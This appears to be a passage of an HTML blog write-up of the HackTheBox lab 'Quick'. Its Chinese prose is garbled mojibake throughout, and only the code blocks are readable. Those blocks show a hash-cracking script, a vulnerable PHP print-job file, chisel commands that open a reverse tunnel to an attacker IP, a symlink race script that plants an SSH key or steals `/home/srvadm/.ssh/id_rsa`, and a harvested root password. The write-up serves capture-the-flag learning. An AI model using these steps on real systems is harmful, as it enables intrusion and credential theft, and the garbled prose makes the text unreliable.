å¯†éƒ½ä¸ç®—éš¾ã€‚æˆ‘ä»¬ç›´æ¥ç”¨è„šæœ¬+rockyou.txtæ¥è¯•è¯•çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(s.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md.hexdigest()</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'rockyou.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        word=f.readline().strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    hashes=crypt.crypt(word,<span class="string">'fa'</span>)</span><br><span class="line">    cipher=get_md5(hashes)</span><br><span class="line">    <span class="keyword">if</span> cipher==<span class="string">'e626d51f8fbfd1124fdea88396c35d05'</span>:</span><br><span class="line">        print(<span class="string">'Found: '</span>+word)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°srvadmçš„å¯†ç åå½“ç„¶å…ˆè¯•è¯•çœ‹æ˜¯ä¸æ˜¯sshæˆ–è€…ç³»ç»Ÿå¯†ç äº†ã€‚ä½†å¾ˆå¯æƒœéƒ½ä¸æ˜¯ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œè¿™ä¸ªå¯†ç åªèƒ½åœ¨webæœåŠ¡ä¸Šå‘æŒ¥ä½œç”¨äº†ã€‚é‚£ä¹ˆè¯´è¿˜æœ‰å…¶ä»–webæœåŠ¡ï¼Ÿ</p><p>è¿™æ—¶æˆ‘æ³¨æ„åˆ°äº†<code>/var/www/</code>é‡Œé™¤äº†htmlè¿˜æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¯¡å¼‚çš„æ˜¯jobsæ˜¯<code>777</code>æƒé™ã€‚ä¼¼ä¹å¯ä»¥åšæ–‡ç« ã€‚é‚£ä¹ˆè½¬è€Œå»æ—è¾¹çš„printerä¸­æ‰¾ã€‚å‘ç°åˆæ˜¯ä¸€å¥—å¸¦äº†cmsçš„phpæºç ã€‚å¹¶ä¸”ç”¨çš„æ•°æ®åº“è·Ÿä¹‹å‰htmlä¸­çš„æ˜¯ä¸€è‡´çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çˆ†ç ´å‡ºçš„å¯†ç æœ‰ç”¨äº†ã€‚</p><p>ç®€å•å®¡ä¸‹åå‘ç°ä¸€ä¸ªä¼¼ä¹å­˜åœ¨æ¼æ´çš„åœ°æ–¹(å®é™…ä¸Šå½“æ—¶å…³æ³¨ç‚¹é”™äº†)<br>job.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/escpos-php/vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mike42</span>\<span class="title">Escpos</span>\<span class="title">PrintConnectors</span>\<span class="title">NetworkPrintConnector</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mike42</span>\<span class="title">Escpos</span>\<span class="title">Printer</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"db.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">"loggedin"</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$title=$_POST[<span class="string">"title"</span>];</span><br><span class="line">$file = date(<span class="string">"Y-m-d_H:i:s"</span>);</span><br><span class="line">file_put_contents(<span class="string">"/var/www/jobs/"</span>.$file,$_POST[<span class="string">"desc"</span>]);</span><br><span class="line">chmod(<span class="string">"/var/www/printer/jobs/"</span>.$file,<span class="string">"0777"</span>);</span><br><span class="line">$stmt=$conn-&gt;prepare(<span class="string">"select ip,port from jobs"</span>);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result=$stmt-&gt;get_result();</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$row=$result-&gt;fetch_assoc();</span><br><span class="line">$ip=$row[<span class="string">"ip"</span>];</span><br><span class="line">$port=$row[<span class="string">"port"</span>];</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">$connector = <span class="keyword">new</span> NetworkPrintConnector($ip,$port);</span><br><span class="line">sleep(<span class="number">0.5</span>); <span class="comment">//Buffer for socket check</span></span><br><span class="line">$printer = <span class="keyword">new</span> Printer($connector);</span><br><span class="line">$printer -&gt; text(file_get_contents(<span class="string">"/var/www/jobs/"</span>.$file));</span><br><span class="line">$printer -&gt; cut();</span><br><span class="line">$printer -&gt; close();</span><br><span class="line">$message=<span class="string">"Job assigned"</span>;</span><br><span class="line">unlink(<span class="string">"/var/www/jobs/"</span>.$file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $error) </span><br><span class="line">&#123;</span><br><span class="line">$error=<span class="string">"Can't connect to printer."</span>;</span><br><span class="line">unlink(<span class="string">"/var/www/jobs/"</span>.$file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$error=<span class="string">"Couldn't find printer."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Invalid Username/Password");window.location.href="index.php";&lt;/script&gt;'</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç”¨åˆ°çš„æ¡†æ¶çš„éƒ¨åˆ†ç»æœç´¢åå‘ç°åªæ˜¯ä¸€ä¸ªç±»ä¼¼â€˜æ‰“å°â€™åŠŸèƒ½çš„æ¡†æ¶ã€‚æ¯”å¦‚<code>NetworkPrintConnector</code>å°±æ˜¯è°ƒç”¨äº†ä¸€ä¸ª<code>fsockopen()</code>ã€‚</p><p>æ¥ä¸‹æ¥çš„éƒ¨åˆ†å°±æ˜¯æœ€è®©æˆ‘å¤´ç–¼çš„éƒ¨åˆ†ã€‚å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ç»éªŒä¸è¶³å§ã€‚ç°åœ¨æ—¢ç„¶è¦ææƒï¼Œå¹¶ä¸”æœ‰å­˜åœ¨æ¼æ´çš„webæœåŠ¡äº†ï¼Œé‚£ä¹ˆå®ƒè‚¯å®šå¾—æ˜¯<code>srvadm</code>è¿è¡Œçš„ï¼Œæ‰èƒ½è®©æˆ‘æœ‰ææƒæœºä¼šã€‚ç„¶è€Œæˆ‘åœ¨æ‰¾æœåŠ¡è¿™é‡Œå´æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼šå¼€å§‹çœ‹ç«¯å£å‘ç°æœ‰80ç«¯å£ï¼Œäºæ˜¯ç›´æ¥<code>curl</code>.å¾—åˆ°çš„å´æ˜¯ä¹‹å‰9001ç«¯å£çš„php+esigateé¡µé¢ã€‚å¯¼è‡´æˆ‘ä»¥ä¸º80ç«¯å£è¿è¡Œçš„æ˜¯nginxç»™javaåšçš„åä»£ã€‚ä¹‹åæŠŠé¶æœºç«¯å£å…¨è¿‡äº†ä¸€éä¹Ÿæ²¡æœ‰æ‰¾åˆ°å“ªä¸ªç«¯å£æ˜¯è·‘çš„printerçš„webæœåŠ¡ã€‚ç”šè‡³ä¹Ÿæ²¡æ‰¾åˆ°srvadmåœ¨è¿è¡Œä»€ä¹ˆæœåŠ¡çš„ä¿¡æ¯ã€‚å¯¼è‡´è‡ªå·±ç¬é—´è¿·èŒ«ã€‚</p><p>ä¹‹ååœ¨è¿™å—è¯¢é—®äº†ä¸‹å¤–å›½å‹äºº<code>bigFish43</code>ã€‚ä»–ç»™æˆ‘çš„æç¤ºæ˜¯æŸ¥çœ‹ä¸‹apacheçš„configæ–‡ä»¶ã€‚äºæ˜¯æ€è·¯ç¬é—´æ˜æœ—èµ·æ¥ã€‚<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åœ¨<code>sites-enabled/000-default.conf</code>é‡Œæ‰¾åˆ°äº†å­åŸŸå<code>printerv2.quick.htb</code>å¹¶ä¸”æ­£å¦‚æ‰€é¢„æ–™çš„ï¼Œæ˜¯ä»¥srvadmç”¨æˆ·è¿è¡Œçš„ã€‚</p><p>apacheçš„<code>virtualhost</code>è·‘åœ¨80ç«¯å£ä¸Šã€‚ä¸è¿‡åŒæ—¶æˆ‘ä»¬çŸ¥é“htmlæ–‡ä»¶å¤¹é‡Œçš„çš„æœåŠ¡ä¹Ÿè·‘åœ¨80ç«¯å£ä¸Šã€‚é‚£ä¹ˆéœ€è¦æ›´æ”¹Hostæ‰èƒ½è®¿é—®<br>é¶æœºä¸Š<br><code>curl localhost -H &#39;Host: printerv2.quick.htb&#39;</code>åç»ˆäºå¾—åˆ°äº†æ¥è‡ªprinterçš„å›æ˜¾ã€‚é‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯ï¼Œä¸ºäº†ç›´æ¥åœ¨æœ¬åœ°è®¿é—®åˆ°printerv2.quick.htbï¼Œå¿…é¡»è¦è¿›è¡Œç«¯å£è½¬å‘äº†ã€‚å› ä¸ºæˆ‘ä»¬æœ€æ—©nmapæ¢æµ‹80ç«¯å£æ—¶æ˜¯æ²¡æœ‰å¼€å¯çš„ã€‚è¯´æ˜è¿™é‡ŒapacheæœåŠ¡æ˜¯è¿è¡Œåœ¨æœ¬åœ°çš„ã€‚</p><p>è½¬å‘ç«¯å£åŒæ ·ä¹Ÿæœ‰è‡³å°‘ä¸¤ç§æ–¹æ³•ã€‚sshæˆ–è€…ä¸Šå·¥å…·<code>chisel</code>ã€‚è¿™é‡Œæˆ‘æ²¡æœ‰ç”¨sshç™»å½•ï¼Œæ‰€ä»¥ç›´æ¥ç”¨<code>chisel</code>ã€‚chiselä¹‹å‰åšsniperä¹Ÿç”¨è¿‡äº†ã€‚è¿™é‡Œç›´æ¥ç•™ä¼ å®Œchiselåçš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#kali</span></span><br><span class="line">./chisel_linux_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line"><span class="comment">#sam@quick</span></span><br><span class="line">./chisel_linux_amd64 client 10.10.14.40:8000 R:80:127.0.0.1:80</span><br></pre></td></tr></table></figure><p>æ„æ€å°±æ˜¯ï¼Œé¶æœºå€Ÿç”¨8000ç«¯å£çš„ä¸­è½¬ï¼ŒæŠŠé¶æœºçš„80ç«¯å£è½¬åˆ°kaliçš„127.0.0.1:80å³æœ¬åœ°80ç«¯å£.</p><p>è¿™æ ·å°±æŠŠ80ç«¯å£è½¬å‘åˆ°æœ¬åœ°äº†ã€‚æ¥ä¸‹æ¥ç”±äºè¦ä¿®æ”¹hostnameã€‚å› ä¸ºä¸æƒ³å½±å“è®¿é—®ä¹‹å‰çš„ç½‘å€ã€‚ç›´æ¥å¼€ä¸ªburpæ¥ä¿®æ”¹Host header.<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åªè¦ä¿æŒburpæ‰“å¼€ï¼Œæˆ‘ä»¬æ¯æ¬¡è®¿é—®çš„Hostéƒ½ä¼šè¢«æ›¿æ¢.<br>å³å¯åœ¨æœ¬åœ°è®¿é—®è¿›è¡Œæ“ä½œã€‚<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ¸—é€çš„éš¾ç‚¹äº†ã€‚å‰é¢æåˆ°è¯´job.phpçœ‹èµ·æ¥æœ‰æ¼æ´ï¼Œä½†ç©¶ç«Ÿæ¼æ´åœ¨å“ªï¼Ÿå¼€å§‹æˆ‘è§‰å¾—æœ‰æ¼æ´æ˜¯å› ä¸ºé‡Œé¢å‡ºç°äº†<code>chmod(xxx,777)</code>ã€‚ä½†ä»”ç»†ä¸€çœ‹å´å‘ç°é‚£ä¸ª<code>/var/www/printer/jobs</code>è·¯å¾„ä¸å­˜åœ¨ï¼Ÿæ—¢ç„¶å¦‚æ­¤ï¼Œä»£ç é€»è¾‘å°±æ˜¯ï¼š</p><ul><li>æ¥å—æˆ‘ä»¬postçš„å‚æ•°ï¼Œæ‰§è¡Œ<code>file_put_contents()</code>åœ¨<code>/var/www/jobs</code>å†™å…¥ä¸€ä¸ªæ–‡ä»¶åä¸ºå½“å‰æ—¥æœŸçš„æ–‡ä»¶ã€‚å¹¶ä¸”chmodä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚</li><li>æ‰§è¡ŒsqlæŸ¥è¯¢ã€‚å‡å¦‚jobsåº“é‡Œæœ‰å†…å®¹ã€‚æŒ‰ç…§æŸ¥è¯¢ç»“æœè¿œç¨‹è¿æ¥åˆ°å¯¹åº”çš„ip,port.sleep(0.5)åæ‰§è¡Œ<code>file_get_contents()</code>è¯»æˆ‘ä»¬ä¹‹å‰çš„æ–‡ä»¶ï¼Œå¹¶æœ€ååˆ é™¤;jobsåº“æ— å†…å®¹ç›´æ¥é€€å‡ºã€‚</li></ul><p>è¿™é‡Œå¡äº†å¥½ä¹…åæˆ‘çªç„¶æƒ³èµ·æ¥<code>/var/www/jobs</code>æ–‡ä»¶å¤¹æ˜¯777æƒé™ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å†™æ–‡ä»¶è¿™ç‚¹å°±éå¸¸é‡è¦ã€‚äºæ˜¯ç«‹åˆ»å°±æœ‰äº†ä¸¤ç§ä½¿ç”¨çŸ­é“¾æ¥çš„æ¡ä»¶ç«äº‰</p><ul><li><p>ä¸è¦åœ¨æ•°æ®åº“ä¸­æ’å…¥æ–°æ•°æ®ã€‚è¿™æ ·srvadmåˆ›å»ºçš„æ–‡ä»¶å°±ä¼šç•™ä¸‹æ¥ã€‚å¦‚æœæˆ‘ä»¬æå‰åˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶(å› ä¸ºæ–‡ä»¶åä¸ºæ—¶é—´è¿™ç‚¹æ˜¯å¯é¢„æµ‹çš„)ã€‚å¹¶åˆ©ç”¨<strong>çŸ­é“¾æ¥</strong>å°†å…¶é“¾æ¥å‘srvadmçš„sshkey.é‚£ä¹ˆæ‰§è¡Œ<code>file_put_contents()</code>æ—¶ä¸å°±å¯ä»¥å†™å…¥æˆ‘ä»¬è‡ªå·±çš„å…¬é’¥äº†å—ï¼Ÿ</p></li><li><p>åœ¨å‰é¢printer.phpå°±è¾“å…¥hostè·Ÿport.å³åœ¨æ•°æ®åº“æ’å…¥æ•°æ®ã€‚è¿™æ ·job.phpå°±ä¼šè¿›è¡Œè¯»æ–‡ä»¶å¹¶æ‰“å°å†…å®¹ã€‚è€Œæˆ‘ä»¬å¯ä»¥ç”¨ncæ¥æ”¶ã€‚åªè¦åœ¨å†™æ–‡ä»¶è·Ÿè¯»æ–‡ä»¶çš„é—´éš”ä¸­åˆ æ‰æ–‡ä»¶å¹¶å»ºç«‹ä¸€ä¸ªåˆ°sshç§é’¥çš„<strong>çŸ­é“¾æ¥</strong>ã€‚phpå°±ä¼šæŠŠè¯»åˆ°çš„ç§é’¥å‘ç»™æˆ‘ä»¬ã€‚</p></li></ul><p>è¿™é‡Œä¸¤ç§æ€è·¯åŒæ—¶æƒ³åˆ°ï¼Œæˆ‘ç«‹åˆ»é€‰æ‹©äº†å‰è€…ã€‚å› ä¸ºåè€…ç®—æ¯”è¾ƒçº¯ç²¹çš„æ¡ä»¶ç«äº‰,æ—¶é—´ä¸å¥½æŠŠæ§(æ‰€ä»¥å«<code>Quick</code>)ï¼Œæˆ‘é€‰æ‹©å‰è€…ã€‚</p><p>æ“ä½œèµ·æ¥æ¯”æƒ³è±¡ä¸­ç®€å•ã€‚æˆ‘ä¸€æ¬¡å°±æˆäº†ã€‚å‡å¦‚åŒæ—¶åšé¶æœºçš„äººæ¯”è¾ƒå¤šçš„è¯å°±å¦è°ˆï¼Œ<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å…¶å®å°±æ˜¯ç®—å¥½ä¸€ä¸ªæå‰é‡ã€‚å¹¶ä¸”æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /home/srvadm/.ssh/authorized_keys 2020-06-23_06:00:00</span><br></pre></td></tr></table></figure><p>ç„¶åå·®ä¸å¤šç®—å¥½æ—¶é—´æå‰burpé‡å¤å‘åŒ…ã€‚<br>è¿™é‡Œå› ä¸ºç²¾åº¦è¢«é™åˆ¶åœ¨1s.æ‰€ä»¥å†™å…¥æˆ‘ä»¬çš„keyçš„å¯èƒ½æ€§ä¸å°ã€‚</p><p>ä¹‹åç›´æ¥sshç™»å½•å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa srvadm@10.10.10.186</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘è™½ç„¶æ²¡è¯•ç¬¬äºŒç§æ€è·¯ï¼Œä½†åšå®Œé¶æœºåçœ‹åˆ°å…¶ä»–äººçš„wpé‡Œå†™åˆ°äº†è§£å†³æ–¹æ³•:</p><p>æ‰§è¡Œä¸€ä¸ªbashscript</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;jobs;</span><br><span class="line">while true;</span><br><span class="line">do</span><br><span class="line">        for file in $(ls .);</span><br><span class="line">        do</span><br><span class="line">                rm -rf $file;</span><br><span class="line">                ln -s &#x2F;home&#x2F;srvadm&#x2F;.ssh&#x2F;id_rsa $file;</span><br><span class="line">        done</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>ç„¶åèµ·ä¸€ä¸ªncç›‘å¬ã€‚å¹¶åœ¨job.phpæäº¤å†…å®¹å†™å…¥ã€‚è¿™æ ·å°±èƒ½å¾—åˆ°ç§é’¥å¹¶ä¸”ç›´æ¥ç™»å½•äº†ã€‚</p><p>è¿™æ®µå†…å®¹å…¶å®èŠ±çš„æ—¶é—´ä¸æ¯”ç¬¬ä¸€éƒ¨åˆ†å°‘ã€‚ç”šè‡³äºæˆ‘é‡åˆ°çš„å›°éš¾æ›´å¤šã€‚æ¯”å¦‚åœ¨æ‰¾æœåŠ¡ä¸Šå¤ªå‚»äº†ã€‚ä¹‹åæƒ³èµ·è¿è¡Œpspy64sæ—¶ä¹Ÿå‘ç°äº†ç³»ç»Ÿæ˜¯æœ‰apacheæœåŠ¡è·‘ç€çš„ã€‚é‚£è‚¯å®šå°±å¾—å»æ‰¾é…ç½®æ–‡ä»¶ã€‚ç»“æœè‡ªå·±åªçœ‹äº†apacheçš„<code>apache2.conf</code>å°±äº†äº‹äº†ã€‚è¯¥æ‰“ã€‚ç„¶åå°±æ˜¯åé¢çš„æ¼æ´åˆ©ç”¨ã€‚é‚£ä¸ªchmodç€å®å®³äººï¼Œå¼€å§‹è¿˜æƒ³ç€æŠŠçŸ­é“¾æ¥é“¾åˆ°é‚£ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚ä»”ç»†ä¸€æƒ³æ‰å‘ç°å…¶å®ç›´æ¥é“¾åˆ°keyå°±å¯äº†ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>åˆ°rootçš„éƒ¨åˆ†æ‰æ˜¯çœŸæ­£çš„<code>Quick</code>ã€‚åªéœ€è¦å¾…åœ¨è‡ªå·±çš„homeæ–‡ä»¶å¤¹è¿›è¡Œenumå³å¯ã€‚</p><p>è¿™é‡ŒæŒ‰ç…§sshkeyçš„åˆ›å»ºæ—¶é—´ï¼Œæ‰¾ä¸€ä¸‹3-21ä¹‹å‰ä¸€ä¸ªæœˆä¸åˆ°çš„æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">srvadm@quick:/home/srvadm<span class="comment"># find . -type f -newermt "2020-03-01" ! -newermt "2020-03-21" -ls 2&gt;/dev/null</span></span><br><span class="line">   281794      4 -rw-r--r--   1 srvadm   srvadm       4038 Mar 20 06:23 ./.cache/conf.d/printers.conf</span><br><span class="line">   281793      8 -rw-r--r--   1 srvadm   srvadm       4569 Mar 20 06:20 ./.cache/conf.d/cupsd.conf</span><br><span class="line">   281799     72 -rw-rw-r--   1 srvadm   srvadm      71479 Mar 20 06:46 ./.cache/logs/debug.log</span><br><span class="line">   281798      4 -rw-rw-r--   1 srvadm   srvadm       1136 Mar 20 06:39 ./.cache/logs/error.log</span><br><span class="line">   281791     12 -rw-r--r--   1 srvadm   srvadm       9064 Mar 20 06:19 ./.cache/logs/cups.log</span><br><span class="line">   281425      0 -rw-r--r--   1 srvadm   srvadm          0 Mar 20 02:38 ./.cache/motd.legal-displayed</span><br><span class="line">   281369      4 -rw-r--r--   1 srvadm   srvadm        220 Mar 20 02:16 ./.bash_logout</span><br><span class="line">   281797      4 -rw-------   1 srvadm   srvadm         23 Mar 20 06:46 ./.<span class="built_in">local</span>/share/nano/search_history</span><br><span class="line">   281421      4 -rw-r--r--   1 srvadm   srvadm        222 Mar 20 02:38 ./.ssh/known_hosts</span><br><span class="line">   281418      4 -rw-------   1 srvadm   srvadm       1679 Mar 20 02:37 ./.ssh/id_rsa</span><br><span class="line">   281419      4 -rw-r--r--   1 srvadm   srvadm        394 Mar 20 02:37 ./.ssh/id_rsa.pub</span><br><span class="line">   281370      4 -rw-r--r--   1 srvadm   srvadm       3771 Mar 20 02:16 ./.bashrc</span><br><span class="line">   281371      4 -rw-r--r--   1 srvadm   srvadm        807 Mar 20 02:16 ./.profile</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªä¸ªè¯»åå‘ç°å…³é”®ä¿¡æ¯åœ¨<br>./.cache/conf.d/printers.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeviceURI https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer</span><br></pre></td></tr></table></figure><p>ä¹‹å‰å­¦ssrfæ—¶æ€»ç»“è¿‡urlçš„å±æ€§ã€‚<code>username:password@host</code>çš„æ ¼å¼å‘Šè¯‰äº†æˆ‘ä»¬<code>&amp;ftQ4K3SGde8?</code>å¯†ç ã€‚æ‰€ä»¥ç›´æ¥å°è¯•suåˆ°rootã€‚ç›´æ¥æ‹¿åˆ°rootshell.</p><p>sshä¹Ÿæ˜¯åŒæ ·<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" 